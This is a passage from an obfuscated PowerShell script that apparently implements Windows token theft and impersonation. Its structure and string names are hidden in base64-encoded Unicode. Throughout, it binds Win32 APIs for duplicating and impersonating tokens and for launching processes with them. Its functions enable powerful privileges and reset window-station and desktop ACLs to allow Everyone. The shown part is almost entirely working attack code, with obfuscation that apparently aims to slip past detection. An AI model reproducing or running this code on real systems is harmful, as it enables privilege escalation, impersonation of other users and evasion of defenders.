    $TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGwAUwBpAHoAZQA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    $TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGUAQwBvAHUAbgB0AA=='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    $TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBiAHoAMgA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    $ACL = $TypeBuilder.CreateType()
    $Attributes = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
    $TypeBuilder = $ModuleBuilder.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBDAEMARQBTAFMAXwBBAEwATABPAFcARQBEAF8AQQBDAEUA'))), $Attributes, [System.ValueType])
    $TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABlAGEAZABlAHIA'))), $ACE_HEADER, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    $TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHMAawA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    $TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGQAUwB0AGEAcgB0AA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    $ACCESS_ALLOWED_ACE = $TypeBuilder.CreateType()
    $Attributes = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
    $TypeBuilder = $ModuleBuilder.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABSAFUAUwBUAEUARQA='))), $Attributes, [System.ValueType])
    $TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cABNAHUAbAB0AGkAcABsAGUAVAByAHUAcwB0AGUAZQA='))), [IntPtr], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    $TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQB1AGwAdABpAHAAbABlAFQAcgB1AHMAdABlAGUATwBwAGUAcgBhAHQAaQBvAG4A'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    $TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHUAcwB0AGUAZQBGAG8AcgBtAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    $TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHUAcwB0AGUAZQBUAHkAcABlAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    $TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cAB0AHMAdAByAE4AYQBtAGUA'))), [IntPtr], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    $TRUSTEE = $TypeBuilder.CreateType()
    $Attributes = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
    $TypeBuilder = $ModuleBuilder.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBYAFAATABJAEMASQBUAF8AQQBDAEMARQBTAFMA'))), $Attributes, [System.ValueType])
    $TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwByAGYAQQBjAGMAZQBzAHMAUABlAHIAbQBpAHMAcwBpAG8AbgBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    $TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwByAGYAQQBjAGMAZQBzAHMATQBvAGQAZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    $TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwByAGYASQBuAGgAZQByAGkAdABhAG4AYwBlAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    $TypeBuilder.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHUAcwB0AGUAZQA='))), $TRUSTEE, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    $EXPLICIT_ACCESS = $TypeBuilder.CreateType()
    $OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
	$OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
	$OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
    $OpenProcessTokenAddr = Get-ProcAddress advapi32.dll OpenProcessToken
	$OpenProcessTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr].MakeByRefType()) ([Bool])
	$OpenProcessToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessTokenAddr, $OpenProcessTokenDelegate)    
    $GetTokenInformationAddr = Get-ProcAddress advapi32.dll GetTokenInformation
	$GetTokenInformationDelegate = Get-DelegateType @([IntPtr], $TOKEN_INFORMATION_CLASS, [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
	$GetTokenInformation = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetTokenInformationAddr, $GetTokenInformationDelegate)    
    $SetThreadTokenAddr = Get-ProcAddress advapi32.dll SetThreadToken
	$SetThreadTokenDelegate = Get-DelegateType @([IntPtr], [IntPtr]) ([Bool])
	$SetThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($SetThreadTokenAddr, $SetThreadTokenDelegate)    
    $ImpersonateLoggedOnUserAddr = Get-ProcAddress advapi32.dll ImpersonateLoggedOnUser
	$ImpersonateLoggedOnUserDelegate = Get-DelegateType @([IntPtr]) ([Bool])
	$ImpersonateLoggedOnUser = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateLoggedOnUserAddr, $ImpersonateLoggedOnUserDelegate)
    $RevertToSelfAddr = Get-ProcAddress advapi32.dll RevertToSelf
	$RevertToSelfDelegate = Get-DelegateType @() ([Bool])
	$RevertToSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($RevertToSelfAddr, $RevertToSelfDelegate)
    $LsaGetLogonSessionDataAddr = Get-ProcAddress secur32.dll LsaGetLogonSessionData
	$LsaGetLogonSessionDataDelegate = Get-DelegateType @([IntPtr], [IntPtr].MakeByRefType()) ([UInt32])
	$LsaGetLogonSessionData = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LsaGetLogonSessionDataAddr, $LsaGetLogonSessionDataDelegate)
    $CreateProcessWithTokenWAddr = Get-ProcAddress advapi32.dll CreateProcessWithTokenW
	$CreateProcessWithTokenWDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) ([Bool])
	$CreateProcessWithTokenW = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateProcessWithTokenWAddr, $CreateProcessWithTokenWDelegate)
    $memsetAddr = Get-ProcAddress msvcrt.dll memset
	$memsetDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
	$memset = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memsetAddr, $memsetDelegate)
    $DuplicateTokenExAddr = Get-ProcAddress advapi32.dll DuplicateTokenEx
	$DuplicateTokenExDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr], [UInt32], [UInt32], [IntPtr].MakeByRefType()) ([Bool])
	$DuplicateTokenEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DuplicateTokenExAddr, $DuplicateTokenExDelegate)
    $LookupAccountSidWAddr = Get-ProcAddress advapi32.dll LookupAccountSidW
	$LookupAccountSidWDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UInt32].MakeByRefType(), [IntPtr], [UInt32].MakeByRefType(), [UInt32].MakeByRefType()) ([Bool])
	$LookupAccountSidW = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupAccountSidWAddr, $LookupAccountSidWDelegate)
    $CloseHandleAddr = Get-ProcAddress kernel32.dll CloseHandle
	$CloseHandleDelegate = Get-DelegateType @([IntPtr]) ([Bool])
	$CloseHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CloseHandleAddr, $CloseHandleDelegate)
    $LsaFreeReturnBufferAddr = Get-ProcAddress secur32.dll LsaFreeReturnBuffer
	$LsaFreeReturnBufferDelegate = Get-DelegateType @([IntPtr]) ([UInt32])
	$LsaFreeReturnBuffer = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LsaFreeReturnBufferAddr, $LsaFreeReturnBufferDelegate)
    $OpenThreadAddr = Get-ProcAddress kernel32.dll OpenThread
	$OpenThreadDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
	$OpenThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadAddr, $OpenThreadDelegate)
    $OpenThreadTokenAddr = Get-ProcAddress advapi32.dll OpenThreadToken
	$OpenThreadTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
	$OpenThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadTokenAddr, $OpenThreadTokenDelegate)
    $CreateProcessAsUserWAddr = Get-ProcAddress advapi32.dll CreateProcessAsUserW
	$CreateProcessAsUserWDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) ([Bool])
	$CreateProcessAsUserW = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateProcessAsUserWAddr, $CreateProcessAsUserWDelegate)
    $OpenWindowStationWAddr = Get-ProcAddress user32.dll OpenWindowStationW
    $OpenWindowStationWDelegate = Get-DelegateType @([IntPtr], [Bool], [UInt32]) ([IntPtr])
    $OpenWindowStationW = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenWindowStationWAddr, $OpenWindowStationWDelegate)
    $OpenDesktopAAddr = Get-ProcAddress user32.dll OpenDesktopA
    $OpenDesktopADelegate = Get-DelegateType @([String], [UInt32], [Bool], [UInt32]) ([IntPtr])
    $OpenDesktopA = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenDesktopAAddr, $OpenDesktopADelegate)
    $ImpersonateSelfAddr = Get-ProcAddress Advapi32.dll ImpersonateSelf
    $ImpersonateSelfDelegate = Get-DelegateType @([Int32]) ([Bool])
    $ImpersonateSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateSelfAddr, $ImpersonateSelfDelegate)
    $LookupPrivilegeValueAddr = Get-ProcAddress Advapi32.dll LookupPrivilegeValueA
    $LookupPrivilegeValueDelegate = Get-DelegateType @([String], [String], $LUID.MakeByRefType()) ([Bool])
    $LookupPrivilegeValue = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupPrivilegeValueAddr, $LookupPrivilegeValueDelegate)
    $AdjustTokenPrivilegesAddr = Get-ProcAddress Advapi32.dll AdjustTokenPrivileges
    $AdjustTokenPrivilegesDelegate = Get-DelegateType @([IntPtr], [Bool], $TOKEN_PRIVILEGES.MakeByRefType(), [UInt32], [IntPtr], [IntPtr]) ([Bool])
    $AdjustTokenPrivileges = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AdjustTokenPrivilegesAddr, $AdjustTokenPrivilegesDelegate)
    $GetCurrentThreadAddr = Get-ProcAddress kernel32.dll GetCurrentThread
    $GetCurrentThreadDelegate = Get-DelegateType @() ([IntPtr])
    $GetCurrentThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetCurrentThreadAddr, $GetCurrentThreadDelegate)
    $GetSecurityInfoAddr = Get-ProcAddress advapi32.dll GetSecurityInfo
    $GetSecurityInfoDelegate = Get-DelegateType @([IntPtr], [UInt32], [UInt32], [IntPtr].MakeByRefType(), [IntPtr].MakeByRefType(), [IntPtr].MakeByRefType(), [IntPtr].MakeByRefType(), [IntPtr].MakeByRefType()) ([UInt32])
    $GetSecurityInfo = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetSecurityInfoAddr, $GetSecurityInfoDelegate)
    $SetSecurityInfoAddr = Get-ProcAddress advapi32.dll SetSecurityInfo
    $SetSecurityInfoDelegate = Get-DelegateType @([IntPtr], [UInt32], [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) ([UInt32])
    $SetSecurityInfo = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($SetSecurityInfoAddr, $SetSecurityInfoDelegate)
    $GetAceAddr = Get-ProcAddress advapi32.dll GetAce
    $GetAceDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr].MakeByRefType()) ([IntPtr])
    $GetAce = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetAceAddr, $GetAceDelegate)
    $LookupAccountSidWAddr = Get-ProcAddress advapi32.dll LookupAccountSidW
    $LookupAccountSidWDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UInt32].MakeByRefType(), [IntPtr], [UInt32].MakeByRefType(), [UInt32].MakeByRefType()) ([Bool])
    $LookupAccountSidW = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupAccountSidWAddr, $LookupAccountSidWDelegate)
    $AddAccessAllowedAceAddr = Get-ProcAddress advapi32.dll AddAccessAllowedAce
    $AddAccessAllowedAceDelegate = Get-DelegateType @([IntPtr], [UInt32], [UInt32], [IntPtr]) ([Bool])
    $AddAccessAllowedAce = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AddAccessAllowedAceAddr, $AddAccessAllowedAceDelegate)
    $CreateWellKnownSidAddr = Get-ProcAddress advapi32.dll CreateWellKnownSid
    $CreateWellKnownSidDelegate = Get-DelegateType @([UInt32], [IntPtr], [IntPtr], [UInt32].MakeByRefType()) ([Bool])
    $CreateWellKnownSid = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateWellKnownSidAddr, $CreateWellKnownSidDelegate)
    $SetEntriesInAclWAddr = Get-ProcAddress advapi32.dll SetEntriesInAclW
    $SetEntriesInAclWDelegate = Get-DelegateType @([UInt32], $EXPLICIT_ACCESS.MakeByRefType(), [IntPtr], [IntPtr].MakeByRefType()) ([UInt32])
    $SetEntriesInAclW = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($SetEntriesInAclWAddr, $SetEntriesInAclWDelegate)
    $LocalFreeAddr = Get-ProcAddress kernel32.dll LocalFree
    $LocalFreeDelegate = Get-DelegateType @([IntPtr]) ([IntPtr])
    $LocalFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LocalFreeAddr, $LocalFreeDelegate)
    $LookupPrivilegeNameWAddr = Get-ProcAddress advapi32.dll LookupPrivilegeNameW
    $LookupPrivilegeNameWDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UInt32].MakeByRefType()) ([Bool])
    $LookupPrivilegeNameW = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupPrivilegeNameWAddr, $LookupPrivilegeNameWDelegate)
    Function Add-SignedIntAsUnsigned
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
		[Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)
		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			$CarryOver = 0
			for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
			{
				[UInt16]$Sum = $Value1Bytes[$i] + $Value2Bytes[$i] + $CarryOver
				$FinalBytes[$i] = $Sum -band 0x00FF
				if (($Sum -band 0xFF00) -eq 0x100)
				{
					$CarryOver = 1
				}
				else
				{
					$CarryOver = 0
				}
			}
		}
		else
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAG4AbgBvAHQAIABhAGQAZAAgAGIAeQB0AGUAYQByAHIAYQB5AHMAIABvAGYAIABkAGkAZgBmAGUAcgBlAG4AdAAgAHMAaQB6AGUAcwA=')))
		}
		return [BitConverter]::ToInt64($FinalBytes, 0)
	}
    function Enable-SeAssignPrimaryTokenPrivilege
    {	
	    [IntPtr]$ThreadHandle = $GetCurrentThread.Invoke()
	    if ($ThreadHandle -eq [IntPtr]::Zero)
	    {
		    Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABnAGUAdAAgAHQAaABlACAAaABhAG4AZABsAGUAIAB0AG8AIAB0AGgAZQAgAGMAdQByAHIAZQBuAHQAIAB0AGgAcgBlAGEAZAA=')))
	    }
	    [IntPtr]$ThreadToken = [IntPtr]::Zero
	    [Bool]$Result = $OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
        $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
	    if ($Result -eq $false)
	    {
		    if ($ErrorCode -eq $Win32Constants.ERROR_NO_TOKEN)
		    {
			    $Result = $ImpersonateSelf.Invoke($Win32Constants.SECURITY_DELEGATION)
			    if ($Result -eq $false)
			    {
				    Throw (New-Object ComponentModel.Win32Exception)
			    }
			    $Result = $OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
			    if ($Result -eq $false)
			    {
				    Throw (New-Object ComponentModel.Win32Exception)
			    }
		    }
		    else
		    {
			    Throw ([ComponentModel.Win32Exception] $ErrorCode)
		    }
	    }
        $CloseHandle.Invoke($ThreadHandle) | Out-Null
        $LuidSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$LUID)
        $LuidPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($LuidSize)
        $LuidObject = [System.Runtime.InteropServices.Marshal]::PtrToStructure($LuidPtr, [Type]$LUID)
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($LuidPtr)
	    $Result = $LookupPrivilegeValue.Invoke($null, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAEEAcwBzAGkAZwBuAFAAcgBpAG0AYQByAHkAVABvAGsAZQBuAFAAcgBpAHYAaQBsAGUAZwBlAA=='))), [Ref] $LuidObject)
	    if ($Result -eq $false)
	    {
		    Throw (New-Object ComponentModel.Win32Exception)
	    }
        [UInt32]$LuidAndAttributesSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$LUID_AND_ATTRIBUTES)
        $LuidAndAttributesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($LuidAndAttributesSize)
        $LuidAndAttributes = [System.Runtime.InteropServices.Marshal]::PtrToStructure($LuidAndAttributesPtr, [Type]$LUID_AND_ATTRIBUTES)
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($LuidAndAttributesPtr)
        $LuidAndAttributes.Luid = $LuidObject
        $LuidAndAttributes.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED
        [UInt32]$TokenPrivSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$TOKEN_PRIVILEGES)
        $TokenPrivilegesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivSize)
        $TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesPtr, [Type]$TOKEN_PRIVILEGES)
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesPtr)
	    $TokenPrivileges.PrivilegeCount = 1
	    $TokenPrivileges.Privileges = $LuidAndAttributes
        $Global:TokenPriv = $TokenPrivileges
	    $Result = $AdjustTokenPrivileges.Invoke($ThreadToken, $false, [Ref] $TokenPrivileges, $TokenPrivSize, [IntPtr]::Zero, [IntPtr]::Zero)
	    if ($Result -eq $false)
	    {
            Throw (New-Object ComponentModel.Win32Exception)
	    }
        $CloseHandle.Invoke($ThreadToken) | Out-Null
    }
    function Enable-Privilege
    {
        Param(
            [Parameter()]
            [ValidateSet("SeAssignPrimaryTokenPrivilege", "SeAuditPrivilege", "SeBackupPrivilege", "SeChangeNotifyPrivilege", "SeCreateGlobalPrivilege",
                "SeCreatePagefilePrivilege", "SeCreatePermanentPrivilege", "SeCreateSymbolicLinkPrivilege", "SeCreateTokenPrivilege",
                "SeDebugPrivilege", "SeEnableDelegationPrivilege", "SeImpersonatePrivilege", "SeIncreaseBasePriorityPrivilege",
                "SeIncreaseQuotaPrivilege", "SeIncreaseWorkingSetPrivilege", "SeLoadDriverPrivilege", "SeLockMemoryPrivilege", "SeMachineAccountPrivilege",
                "SeManageVolumePrivilege", "SeProfileSingleProcessPrivilege", "SeRelabelPrivilege", "SeRemoteShutdownPrivilege", "SeRestorePrivilege",
                "SeSecurityPrivilege", "SeShutdownPrivilege", "SeSyncAgentPrivilege", "SeSystemEnvironmentPrivilege", "SeSystemProfilePrivilege",
                "SeSystemtimePrivilege", "SeTakeOwnershipPrivilege", "SeTcbPrivilege", "SeTimeZonePrivilege", "SeTrustedCredManAccessPrivilege",
                "SeUndockPrivilege", "SeUnsolicitedInputPrivilege")]
            [String]
            $Privilege
        )
	    [IntPtr]$ThreadHandle = $GetCurrentThread.Invoke()
	    if ($ThreadHandle -eq [IntPtr]::Zero)
	    {
		    Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABnAGUAdAAgAHQAaABlACAAaABhAG4AZABsAGUAIAB0AG8AIAB0AGgAZQAgAGMAdQByAHIAZQBuAHQAIAB0AGgAcgBlAGEAZAA=')))
	    }
	    [IntPtr]$ThreadToken = [IntPtr]::Zero
	    [Bool]$Result = $OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
        $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
	    if ($Result -eq $false)
	    {
		    if ($ErrorCode -eq $Win32Constants.ERROR_NO_TOKEN)
		    {
			    $Result = $ImpersonateSelf.Invoke($Win32Constants.SECURITY_DELEGATION)
			    if ($Result -eq $false)
			    {
				    Throw (New-Object ComponentModel.Win32Exception)
			    }
			    $Result = $OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
			    if ($Result -eq $false)
			    {
				    Throw (New-Object ComponentModel.Win32Exception)
			    }
		    }
		    else
		    {
			    Throw ([ComponentModel.Win32Exception] $ErrorCode)
		    }
	    }
        $CloseHandle.Invoke($ThreadHandle) | Out-Null
        $LuidSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$LUID)
        $LuidPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($LuidSize)
        $LuidObject = [System.Runtime.InteropServices.Marshal]::PtrToStructure($LuidPtr, [Type]$LUID)
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($LuidPtr)
	    $Result = $LookupPrivilegeValue.Invoke($null, $Privilege, [Ref] $LuidObject)
	    if ($Result -eq $false)
	    {
		    Throw (New-Object ComponentModel.Win32Exception)
	    }
        [UInt32]$LuidAndAttributesSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$LUID_AND_ATTRIBUTES)
        $LuidAndAttributesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($LuidAndAttributesSize)
        $LuidAndAttributes = [System.Runtime.InteropServices.Marshal]::PtrToStructure($LuidAndAttributesPtr, [Type]$LUID_AND_ATTRIBUTES)
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($LuidAndAttributesPtr)
        $LuidAndAttributes.Luid = $LuidObject
        $LuidAndAttributes.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED
        [UInt32]$TokenPrivSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$TOKEN_PRIVILEGES)
        $TokenPrivilegesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivSize)
        $TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesPtr, [Type]$TOKEN_PRIVILEGES)
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesPtr)
	    $TokenPrivileges.PrivilegeCount = 1
	    $TokenPrivileges.Privileges = $LuidAndAttributes
        $Global:TokenPriv = $TokenPrivileges
        Write-Verbose "Attempting to enable privilege: $Privilege"
	    $Result = $AdjustTokenPrivileges.Invoke($ThreadToken, $false, [Ref] $TokenPrivileges, $TokenPrivSize, [IntPtr]::Zero, [IntPtr]::Zero)
	    if ($Result -eq $false)
	    {
            Throw (New-Object ComponentModel.Win32Exception)
	    }
        $CloseHandle.Invoke($ThreadToken) | Out-Null
        Write-Verbose "Enabled privilege: $Privilege"
    }
    function Set-DesktopACLs
    {
        Enable-Privilege -Privilege SeSecurityPrivilege
        $WindowStationStr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AUwB0AGEAMAA='))))
        $hWinsta = $OpenWindowStationW.Invoke($WindowStationStr, $false, $Win32Constants.ACCESS_SYSTEM_SECURITY -bor $Win32Constants.READ_CONTROL -bor $Win32Constants.WRITE_DAC)
        if ($hWinsta -eq [IntPtr]::Zero)
        {
            Throw (New-Object ComponentModel.Win32Exception)
        }
        Set-DesktopACLToAllowEveryone -hObject $hWinsta
        $CloseHandle.Invoke($hWinsta) | Out-Null
        $hDesktop = $OpenDesktopA.Invoke($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABlAGYAYQB1AGwAdAA='))), 0, $false, $Win32Constants.DESKTOP_GENERIC_ALL -bor $Win32Constants.WRITE_DAC)
        if ($hDesktop -eq [IntPtr]::Zero)
        {
            Throw (New-Object ComponentModel.Win32Exception)
        }
        Set-DesktopACLToAllowEveryone -hObject $hDesktop
        $CloseHandle.Invoke($hDesktop) | Out-Null
    }
    function Set-DesktopACLToAllowEveryone
    {
        Param(
            [IntPtr]$hObject
            )
        [IntPtr]$ppSidOwner = [IntPtr]::Zero
        [IntPtr]$ppsidGroup = [IntPtr]::Zero
        [IntPtr]$ppDacl = [IntPtr]::Zero
        [IntPtr]$ppSacl = [IntPtr]::Zero
        [IntPtr]$ppSecurityDescriptor = [IntPtr]::Zero
        $retVal = $GetSecurityInfo.Invoke($hObject, 0x7, $Win32Constants.DACL_SECURITY_INFORMATION, [Ref]$ppSidOwner, [Ref]$ppSidGroup, [Ref]$ppDacl, [Ref]$ppSacl, [Ref]$ppSecurityDescriptor)
        if ($retVal -ne 0)
        {
            Write-Error "Unable to call GetSecurityInfo. ErrorCode: $retVal"
        }
        if ($ppDacl -ne [IntPtr]::Zero)
        {
